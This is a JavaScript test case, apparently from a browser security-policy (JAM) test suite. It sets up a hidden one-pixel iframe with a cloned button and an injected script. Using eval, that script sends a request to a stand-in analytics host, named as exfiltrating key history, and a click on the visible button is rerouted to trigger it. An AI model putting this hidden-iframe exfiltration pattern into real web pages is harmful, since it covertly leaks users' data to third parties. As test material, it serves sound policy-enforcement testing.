function runTest() {
  introspect(JAM.policy.pFull) {
  function click_inner() {
    var event$$1 = new Event("click");
    document.getElementById("test2").dispatchEvent(event$$1)
  }
  var pol = document.head.childNodes[5];
  var tx = document.head.childNodes[7];
  var button = document.getElementById("test");
  var button2 = button.cloneNode(true);
  button2.id = "test2";
  var script = document.createElement("script");
  script.innerHTML = "function exfiltrate_key_history() {var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open(\"GET\", \"http://AnalyticsInc:8000/submission.html?test=iframe\", true);xmlhttp.send(null);';eval(exp);}document.getElementById('test2').onclick = exfiltrate_key_history;";
  var frm = document.createElement("iframe");
  frm.setAttribute("id", "ifrm");
  frm.setAttribute("src", "JavaScript:''");
  frm.style.width = "1px";
  frm.style.height = "1px";
  frm.appendChild(tx);
  frm.appendChild(button2);
  frm.appendChild(script);
  document.body.appendChild(frm);
  document.getElementById("test").onclick = click_inner;

  }

  return "RESULT NOT SPECIFIED";
}
